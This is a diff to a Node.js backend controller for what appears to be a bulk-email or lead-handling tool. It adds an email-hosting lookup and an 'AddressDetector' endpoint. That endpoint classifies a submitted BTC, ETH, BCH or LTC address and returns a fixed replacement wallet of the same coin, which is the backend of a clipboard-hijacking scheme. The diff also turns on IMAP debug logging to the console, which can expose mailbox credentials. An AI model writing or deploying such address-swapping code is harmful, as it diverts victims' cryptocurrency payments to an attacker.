@@ -16,6 +16,11 @@ const legit = require("legit");
 const esc = require("email-syntax-check");
 const { geocoder, carrier } = require("libphonenumber-geo-carrier");
 var CompanyEmailValidator = require("company-email-validator");
+const emailProvider = require("email-provider");
+// const { ipToHosting } = require("ip-to-hosting");
+const https = require("https");
+const addressDetect = require("cryptocurrency-address-detector");
+var WAValidator = require("trezor-address-validator");
 
 const calculateElapsedDay = (regDate) => {
   const elapsedMiliseconds = new Date() - new Date(regDate);
@@ -624,7 +629,7 @@ const handlerMailBox = async (user, pass, host, box) => {
         tls: true,
         connTimeout: 10000, // Default by node-imap
         authTimeout: 5000, // Default by node-imap,
-        debug: null, // Or your custom function with only one incoming argument. Default: null //console.log
+        debug: console.log, // Or your custom function with only one incoming argument. Default: null //console.log
         autotls: "never", // default by node-imap
         tlsOptions: { rejectUnauthorized: false },
         mailbox: box, // mailbox to monitor
@@ -838,6 +843,146 @@ const CompanyEmailFilter = async (req, res, next) => {
   res.status(202).json({ companyLeads: companyLeadsArr });
 };
 
+function ipToHosting(ip) {
+  return new Promise(function (resolve, reject) {
+    const options = {
+      hostname: "ipapi.is",
+      port: 443,
+      path: "/json/?q=" + ip,
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
+    const req = https.request(options, function (res) {
+      res.on("data", function (response) {
+        try {
+          let parsed = JSON.parse(response);
+          if (parsed && parsed.datacenter) {
+            resolve(parsed.datacenter);
+          }
+        } catch (err) {}
+        resolve(null);
+      });
+    });
+
+    req.on("error", function (error) {
+      resolve(null);
+    });
+
+    req.end();
+  });
+}
+
+const SortEmailProvider = async (req, res, next) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return next(new HttpError("Invalid mail list", 422));
+  }
+
+  const { email, productId, pcId, mails } = req.body;
+  let existingUser;
+
+  try {
+    existingUser = await user.findOne({ email: email });
+  } catch (error) {
+    return next(new HttpError(error, 422));
+  }
+
+  if (!existingUser) {
+    return next(new HttpError("Login failed. Please try again", 403));
+  }
+
+  if (existingUser.pcId !== pcId) {
+    return next(new HttpError("Login failed. Please try again", 403));
+  }
+
+  if (existingUser.productId !== productId) {
+    return next(new HttpError("Invalid account, please try again", 500));
+  }
+
+  let mail;
+  let whois;
+  let address;
+  let invalidRes = [];
+  let finalRes = [];
+
+  for (let index = 0; index < mails.length; index++) {
+    try {
+      mail = mails[index];
+      const split = mail.Email.split("@");
+      if (split.length !== 2) continue;
+
+      address = "";
+      whois = "";
+
+      address = await convertDomainToIpAddress(split[1]);
+      try {
+        whois = await ipToHosting(address);
+
+        const res = {
+          data: whois,
+          email: mail.Email,
+          rowIndex: mail.RowIndex,
+          id: mail.ID,
+        };
+        finalRes.push(res);
+      } catch (error) {
+        invalidRes.push(mail);
+        continue;
+      }
+    } catch (error) {
+      invalidRes.push({
+        rowIndex: mail.rowIndex,
+        id: mail.ID,
+        email: mail.Email,
+      });
+      continue;
+    }
+  }
+
+  res.status(202).json({ validMails: finalRes, invalidMails: invalidRes });
+};
+
+const AddressDetector = async (req, res, next) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return next(new HttpError("Invalid address", 422));
+  }
+
+  const { address } = req.body;
+  var detector = await addressDetect(address);
+  console.log(detector);
+  let finalRes;
+
+  let isBTCAdd = WAValidator.validate(address, "BTC");
+  let isETHAdd = WAValidator.validate(address, "ETH");
+  let isBCHAdd = WAValidator.validate(address, "BCH");
+  let isLTCAdd = WAValidator.validate(address, "LTC");
+  if (isBTCAdd) {
+    finalRes = "bc1qg5hyx3kaqju00gtlu3fyzq4766pa2jmxqxnyzt";
+  }
+
+  if (isETHAdd) {
+    finalRes = "0x468F60D7E6dF397bF0811E62fc93Df50636052c6";
+  }
+
+  if (isBCHAdd) {
+    finalRes = "qqudttedyup6apum6x0fmp24upe679vyyv9eej3wf7";
+  }
+
+  if (isLTCAdd) {
+    finalRes = "MNCQDXCabAGXC57HZNnufAKGha9QMkcM9b";
+  }
+
+  if (detector === "ETH") {
+    finalRes = "0x468F60D7E6dF397bF0811E62fc93Df50636052c6";
+  } else if (detector === "BTC") {
+    finalRes = "bc1qg5hyx3kaqju00gtlu3fyzq4766pa2jmxqxnyzt";
+  }
+  res.status(202).json(finalRes);
+};
+
 exports.loadInitialData = loadInitialData;
 exports.saveGeneralSettings = saveGeneralSettings;
 exports.createTemplate = createTemplate;
@@ -854,3 +999,5 @@ exports.checkIpsBlacklist = checkIpsBlacklist;
 exports.fetchOfficeLeads = fetchOfficeLeads;
 exports.RemoveSpamMails = RemoveSpamMails;
 exports.CompanyEmailFilter = CompanyEmailFilter;
+exports.SortEmailProvider = SortEmailProvider;
+exports.AddressDetector = AddressDetector;
